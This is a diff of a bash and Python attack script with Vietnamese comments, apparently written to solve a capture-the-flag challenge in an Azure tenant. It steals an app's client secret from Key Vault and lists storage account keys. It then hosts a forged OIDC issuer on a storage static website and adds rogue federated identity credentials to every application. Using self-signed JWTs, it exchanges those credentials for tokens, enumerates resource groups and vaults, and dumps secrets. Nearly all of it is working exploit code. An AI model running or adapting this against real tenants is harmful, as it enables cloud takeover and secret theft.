@@ -1,10 +1,13 @@
 #!/usr/bin/env bash
-# v16 — dump đầy đủ Graph (applications, servicePrincipals, appRoleAssignments, oauth2 grants,
-#        groups, directoryRoles) và lọc mọi dấu vết "aws/amazon/arn/sts".
+# v17 — enumerate resource group THỨ HAI (rg-tbl-reporting-prod-eus) + mọi RG khác,
+#        bằng cả 14 app (FIC tạm). Tìm vault/storage/MI ở đó.
 set +e
-TEN="${AZURE_TENANT_ID}"
+TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
+RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
 PROD=kv-tbl-prod-x3euoz
 AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
+HOST="https://$SA.z23.web.core.windows.net"
+PFX="htx-$RANDOM$RANDOM"; SUBJECT="tbl-solver-htx"
 
 gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
@@ -25,78 +28,108 @@ ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
   | python3 -c "
 import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
 G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
-echo "[*] graph=${#G}"
+ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
+KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
+  | python3 -c "
+import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
+curl -sS -H "Authorization: Bearer $G" \
+  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json
 
-get(){ curl -sS -H "Authorization: Bearer $G" "https://graph.microsoft.com/v1.0/$1"; }
+pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
+python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$G" <<'PY'
+import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
+from azure.storage.blob import BlobServiceClient, ContentSettings
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import jwt
+sa,key0,host,pfx,subject,ten,sub,graph = sys.argv[1:9]
+ISS=f"{host}/{pfx}"
+FLAG=re.compile(r'DF26\{[^}]*\}')
+svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
+web=svc.get_container_client("$web")
+priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
+pn=priv.public_key().public_numbers()
+b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
+KID="k-"+uuid.uuid4().hex[:8]
+PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
+JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
+CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
+ "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
+ct=ContentSettings(content_type="application/json")
+for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
+    web.upload_blob(p,b,overwrite=True,content_settings=ct)
 
-echo "================ APPLICATIONS (đầy đủ) ================"
-get 'applications?$top=100' > /tmp/apps_full.json
-python3 - <<'PY'
-import json
-d=json.load(open('/tmp/apps_full.json'))
-for a in d.get('value',[]):
-    print("APP", a.get('displayName'), a.get('appId'))
-    for k in ('identifierUris','notes','tags','signInAudience'):
-        v=a.get(k)
-        if v: print("   ",k,"=",v)
-    w=a.get('web') or {}
-    if w.get('redirectUris'): print("    redirectUris =",w['redirectUris'])
-    api=a.get('api') or {}
-    if api.get('oauth2PermissionScopes'):
-        print("    scopes =",[s.get('value') for s in api['oauth2PermissionScopes']])
-    if a.get('appRoles'): print("    appRoles =",[r.get('value') for r in a['appRoles']])
+def api(url,method="GET",tok=graph,body=None):
+    d=json.dumps(body).encode() if body is not None else None
+    r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
+    try:
+        with urllib.request.urlopen(r,timeout=40) as f:
+            t=f.read(); return json.loads(t) if t else {}
+    except Exception as e:
+        try: return {"error":json.loads(e.read())}
+        except Exception: return {"error":str(e)[:90]}
+def mint():
+    n=int(time.time())
+    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
+      "nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
+def exchange(app,scope):
+    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
+      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+      "client_assertion":mint()}).encode()
+    try:
+        with urllib.request.urlopen(urllib.request.Request(
+          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
+            return json.load(f).get("access_token","")
+    except Exception: return ""
+
+apps=json.load(open("/tmp/apps.json"))["value"]
+created=[]
+for a in apps:
+    r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
+          body={"name":"tmp-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
+    if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
+print("[*] FIC tạm:",len(created)); time.sleep(45)
+
+B="https://management.azure.com"
+best=None
+for oid,fid,appid,name in created:
+    am=exchange(appid,B+"/.default")
+    if not am: continue
+    rgs=api(f"{B}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",tok=am)
+    if "error" in rgs: continue
+    names=[g["name"] for g in rgs.get("value",[])]
+    print(f"  {name}: RGs = {names}")
+    if len(names)>1 and not best: best=(name,appid,am,names)
+
+if not best:
+    print("[!] không app nào thấy >1 RG");
+else:
+    name,appid,am,names=best
+    print(f"================ dùng {name} ================")
+    for g in names:
+        r=api(f"{B}/subscriptions/{sub}/resourceGroups/{g}/resources?api-version=2021-04-01",tok=am)
+        print(f"-- {g}:", json.dumps(r)[:1200])
+    # vault trong RG mới
+    r=api(f"{B}/subscriptions/{sub}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01",tok=am)
+    for v in r.get("value",[]):
+        vn=v["name"]; uri=v["properties"]["vaultUri"].rstrip('/')
+        kt=exchange(appid,"https://vault.azure.net/.default")
+        if not kt: continue
+        l=api(f"{uri}/secrets?api-version=7.4",tok=kt)
+        if "error" in l: print(f"   {vn}: denied"); continue
+        print(f"   {vn}: OK")
+        for s in l.get("value",[]):
+            gg=api(s["id"]+"?api-version=7.4",tok=kt)
+            val=str(gg.get("value",""))
+            f=FLAG.findall(val)
+            print("     ",s["id"].split('/')[-1],"=", ("*** FLAG "+str(f)) if f else val[:400])
+
+print("[*] dọn dẹp")
+for oid,fid,appid,name in created:
+    if fid: api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
+for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
+    try: web.delete_blob(p)
+    except Exception: pass
 PY
-
-echo "================ SERVICE PRINCIPALS ================"
-get 'servicePrincipals?$top=200' > /tmp/sps_full.json
-python3 - <<'PY'
-import json
-d=json.load(open('/tmp/sps_full.json'))
-for s in d.get('value',[]):
-    nm=(s.get('displayName') or '')
-    blob=json.dumps(s).lower()
-    interesting = any(w in blob for w in ('aws','amazon','arn:','sts.','saml'))
-    if interesting or nm.lower().startswith(('tbl','nw')):
-        print("SP", nm, s.get('appId'), s.get('servicePrincipalType'),
-              "ssoMode=",s.get('preferredSingleSignOnMode'))
-        for k in ('servicePrincipalNames','replyUrls','notificationEmailAddresses','tags','loginUrl'):
-            v=s.get(k)
-            if v and v!=[s.get('appId')]: print("   ",k,"=",v)
-PY
-
-echo "================ TÌM 'aws/amazon/arn/sts' TRONG MỌI OBJECT ================"
-python3 - <<'PY'
-import json,re
-pat=re.compile(r'(aws|amazon|arn:aws|sts\.amazonaws)',re.I)
-for f in ('/tmp/apps_full.json','/tmp/sps_full.json'):
-    d=json.load(open(f))
-    for o in d.get('value',[]):
-        s=json.dumps(o)
-        if pat.search(s):
-            print("==",f,o.get('displayName'),o.get('appId'))
-            for m in set(pat.findall(s)): pass
-            # in các trường chứa match
-            def walk(x,p=""):
-                if isinstance(x,dict):
-                    for k,v in x.items(): walk(v,p+"/"+k)
-                elif isinstance(x,list):
-                    for i,v in enumerate(x): walk(v,p+f"[{i}]")
-                elif isinstance(x,str) and pat.search(x):
-                    print("   ",p,"=",x[:200])
-            walk(o)
-PY
-
-echo "================ GROUPS / DIRECTORY ROLES ================"
-get 'groups?$top=50&$select=displayName,id,description' | head -c 1500; echo
-get 'directoryRoles' | python3 -c "
-import sys,json
-for r in json.load(sys.stdin).get('value',[]): print(' ',r.get('displayName'),r.get('id'))" 2>/dev/null
-
-echo "================ MEMBERS CỦA DIRECTORY ROLES ================"
-for RID in $(get 'directoryRoles' | python3 -c "
-import sys,json
-for r in json.load(sys.stdin).get('value',[]): print(r['id'])" 2>/dev/null); do
-  echo "--- $RID"
-  get "directoryRoles/$RID/members?\$select=displayName,appId,id" | head -c 600; echo
-done
 echo "================ DONE ================"
